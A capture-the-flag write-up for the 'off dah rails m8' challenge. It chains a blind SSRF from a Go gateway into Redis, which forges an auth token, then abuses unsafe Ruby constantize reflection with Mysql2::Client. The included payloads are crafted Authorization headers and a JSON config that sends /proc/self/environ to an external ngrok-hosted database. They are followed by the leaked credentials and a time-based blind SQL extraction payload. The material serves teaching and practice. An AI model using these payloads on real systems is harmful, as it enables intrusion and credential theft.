off dah rails m8
============

This challenge consists of two web components:

1. An API gateway that validates the `Authorization: Basic` header that uses Redis for storing API tokens.
2. A minimal rails web application that uses the same Redis server for validating authentication.

The following goes through the steps for solving this challenge.

# Part 1: Blind SSRF to Redis to Create a New Authentication Token

Looking at the code for the API gateway, there are a few bugs:

*`gateway/main.go*
```go
...
func ValidateAuthToken(req *http.Request) (bool, error) {
	u, p, ok := req.BasicAuth()
	if !ok {
		return false, fmt.Errorf("missing auth header")
	}

	res, err := rdb.Get(ctx, u).Result() <1>
	if err != nil {
		return false, err
	}
	return subtle.ConstantTimeCompare([]byte(p), []byte(res)) == 1, nil <1>
}

func proxiedUrl(ou string) (newUrl string) {
	re := regexp.MustCompile(`^(https?://)(.*)(/.*)$`) <2>
	newUrl = re.ReplaceAllString(ou, rewriteURL)
	return newUrl
}

func buildAbsUrl(req *http.Request) (absUrl string, err error) {
	ba := ""
	u, p, ok := req.BasicAuth()
	if ok {
		ba = u + ":" + p + "@" <3>
	}

	return fmt.Sprintf("http://%s%s%s", ba, req.Host, req.URL.RequestURI()), nil <3>
}

func ProxyHandler(w http.ResponseWriter, req *http.Request) {
	if req.Header.Get(proxiedHeader) != "" {
		http.Error(w, "bad gateway", http.StatusBadGateway)
		return
	}
	ar, err := ValidateAuthToken(req)
	if err != nil || !ar {
		http.Error(w, "invalid authentication token", http.StatusForbidden) 
    <4>
	}
	absUrl, err := buildAbsUrl(req)
	if err != nil {
		http.Error(w, "internal server error", http.StatusInternalServerError)
		return
	}
	newUrl := proxiedUrl(absUrl)
	newReq, err := http.NewRequest(req.Method, newUrl, req.Body)
	if err != nil {
		http.Error(w, "bad gateway", http.StatusBadGateway)
		return
	}

	for k, vs := range req.Header {
		if k == "Host" || k == proxiedHeader {
			continue
		}
		newReq.Header.Add(k, vs[0])
	}

	newReq.Header.Add(proxiedHeader, "true")
	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	res, err := client.Do(newReq) <5>
	...
}
```
<1> Authentication is done by reading a key from the Redis server and comparing the values.

<2> Can bypass the regex `ReplaceAllString` by inserting a `\n` in either the opaque or URI section.

<3> Missing URL encoding when building the basic authentication section for the URL.

<4> Missing `return` to stop the processing of the request.

<5> Blind SSRF here, despite missing authentication.

However, the golang `net/url` module performs validation checks for unescaped control characters in a URL, **except for the hash fragment**.
This can be abused by injecting a hash fragment in the `Authorization: Basic` header section that contains a `\n` to break the regex pattern match, and then SSRF to the Redis instance, with an example decoded basic auth header and request shown below.

```go
"mr:fatmonke@127.0.0.1:6379/#\n"
```

```http
GET /test HTTP/1.1
Host: 127.0.0.1:1337
Authorization: Basic bXI6ZmF0bW9ua2VAMTI3LjAuMC4xOjYzNzkvIwo=
User-Agent: curl/7.81.0
Accept: */*
Connection: keep-alive


```

We only have a blind SSRF and [Redis now aliases `Host` as the `QUIT` command](https://github.com/redis/redis/commit/a81a92ca2ceba364f4bb51efde9284d939e7ff47), but you can use the `SET` command to create a new command.
The following decoded basic auth header and request demonstrates creating a new key (`/hacker-user`) where the value would be `HTTP/1.1` by setting the request method to `SET`.

*decoded `Authorization: Basic`*
```go
"mr:fatmonke@127.0.0.1:6379/hacker-user#\n"
```

```http
SET / HTTP/1.1
Host: 127.0.0.1:1337
Authorization: Basic bXI6ZmF0bW9ua2VAMTI3LjAuMC4xOjYzNzkvaGFja2VyLXVzZXIjCg==
User-Agent: curl/7.81.0
Accept: */*
Connection: keep-alive
Content-Length: 0


```

*Confirmation that the new key was created on the redis server*
```
127.0.0.1:6379> get /hacker-user
"HTTP/1.1"
```
 
# Part 2: `mysql` gem unsafe reflection

This section is a follow up to [this article I wrote about unsafe Ruby reflection](https://www.elttam.com/blog/rails-sqlite-gadget-rce/), where the article showcases using the `sqlite3` gem to achieve RCE if there is an unsafe reflection or deserialisation vuln in an application.

Similar to the above article, there is a single controller that is shown below that has an unsafe reflection sink. The goal is to read the flag from the MariaDB database in the container.

```ruby
require 'redis'
require 'json'

class MainController < ApplicationController
  include ActionController::HttpAuthentication::Basic::ControllerMethods

  before_action :authenticate

  def lol_what_could_go_wrong
    if !@authenticated
      request_http_basic_authentication
      return
    end

    config_file = params[:config]
    config_hash = JSON.load_file(config_file)
    config_hash["type"].constantize.new(config_hash["arg"])
    render json: {success: true}
  end

  def req_params
    params.require(:config)
  end

  def authenticate
    authenticate_with_http_basic do |u, p|
      redis = Redis.new(host: "127.0.0.1", port: 6379)
      at = redis.get(u)
      @authenticated = at === p
    end
  end
end
```

We can use the `/proc/self/fd/{num}` trick that I mentioned in [this article](https://www.elttam.com/blog/rails-sqlite-gadget-rce/), so now we need to discover an unsafe reflection to exploit.

In this challenge, the `sqlite3` gem is not installed and is replaced with the `mysql2` gem. However, digging into the `mysql2` gem there is the `Mysql2::Client` class that takes a single hash argument for connecting to a MySQL (or MariaDB) database.

From [the documentation as it shows below](https://github.com/brianmario/mysql2/tree/master?tab=readme-ov-file#connection-options), the `local_infile` options allows the client to load files from the filsystem using the SQL `LOAD DATA LOCAL INFILE`.

```ruby
Mysql2::Client.new(
  :host,
  :username,
  :password,
  :port,
  :database,
  :socket = '/path/to/mysql.sock',
  :flags = REMEMBER_OPTIONS | LONG_PASSWORD | LONG_FLAG | TRANSACTIONS | PROTOCOL_41 | SECURE_CONNECTION | MULTI_STATEMENTS,
  :encoding = 'utf8mb4',
  :read_timeout = seconds,
  :write_timeout = seconds,
  :connect_timeout = seconds,
  :connect_attrs = {:program_name => $PROGRAM_NAME, ...},
  :reconnect = true/false,
  :local_infile = true/false, 
  :secure_auth = true/false,
  :get_server_public_key = true/false,
  :default_file = '/path/to/my.cfg',
  :default_group = 'my.cfg section',
  :default_auth = 'authentication_windows_client'
  :init_command => sql
  )
```

Using this, you can leak the credentials for the MariaDB instance from `/proc/self/environ` to an attacker controlled database. In this folder, there is a [`docker-compose.yml`](./docker-compose.yml) for creating the attacker controlled DB where the following example SQL configures the account the client would log into and enabling `local_infile`.

```sql
CREATE DATABASE hackerdb;
CREATE USER 'hackeruser'@'%' IDENTIFIED BY 'sUperDupert0PS3cRetP4S5w))D'; 
GRANT ALL PRIVILEGES ON *.* TO 'hackeruser'@'%' WITH GRANT OPTION; 
FLUSH PRIVILEGES;
SET GLOBAL local_infile = 'ON';
use hackerdb;
CREATE TABLE leak_env (env BLOB);
```

The following JSON POC exploits the unsafe reflection and loads the contents from `/proc/self/environ` into the attacker controlled DB.

```json
{
    "type": "Mysql2::Client",
    "arg": {
        "host": "7.tcp.eu.ngrok.io",
        "username": "hackeruser",
        "password": "sUperDupert0PS3cRetP4S5w))D",
        "database": "hackerdb",
        "port": 16374,
        "local_infile": true,
        "init_command": "LOAD DATA LOCAL INFILE '/proc/self/environ' INTO TABLE leak_env;"
    }
}
```

*leaked `/proc/self/environ` file saved on the hacker DB*
```
MariaDB [hackerdb]> select env from leak_env;
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| env                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| DB_PASSWORD=de13c3cc60e134ff099875230ebfb9e6480635d273a1fea9d6b31f5766b75f59 SUPERVISOR_GROUP_NAME=off-dah-rails HOSTNAME=e21b56bc7873 RUBY_DOWNLOAD_SHA256=f76d63efe9499dedd8526b74365c0c811af00dc9feb0bed7f5356488476e28f4 RUBY_VERSION=3.4.4 PWD=/var/www/off_dah_rails_m8 BUNDLE_APP_CONFIG=/usr/local/bundle _=/var/www/off_dah_rails_m8/bin/rails DB_USER=thefatcontroller HOME=/var/www LANG=C.UTF-8 BUNDLE_SILENCE_ROOT_WARNING=1 GEM_HOME=/usr/local/bundle RUBY_DOWNLOAD_URL=https://cache.ruby-lang.org/pub/ruby/3.4/ruby-3.4.4.tar.xz SHLVL=1 ADMIN_TOKEN=2973c412991451d5c1b9741a22444007e73c3d1412f92a654d23ffadd63ccc45 SUPERVISOR_PROCESS_NAME=off-dah-rails PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin RAILS_ENV=production MAIL=/var/mail/www-data DEBIAN_FRONTEND=noninteractive SUPERVISOR_ENABLED=1  |
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)
```

Using the leaked DB password and username, you can then connect to the MariaDB in the container. However, since the endpoint only returns either success or a 500 response, to leak the flag you have to perform either a blind attack.

In addition, Rack removes open file descriptors after a certain number of requests, which complicates the final exploit.

The following example JSON uses an error-based approach, that causes a 500 response using the `connect_timeout` option and `sleep(2)` when a character is matched.

```http
{
    "type": "Mysql2::Client",
    "arg": {
        "host": "127.0.0.1",
        "username": "thefatcontroller",
        "password": "de13c3cc60e134ff099875230ebfb9e6480635d273a1fea9d6b31f5766b75f59",
        "database": "off_dah_rails_m8_production",
        "connect_timeout": 1,
        "init_command": "SELECT sleep(2) FROM flag WHERE flag LIKE BINARY 'DUCTF{A%';"
    }
}
```

[`solve.py`](./solve.py) automates the final exploit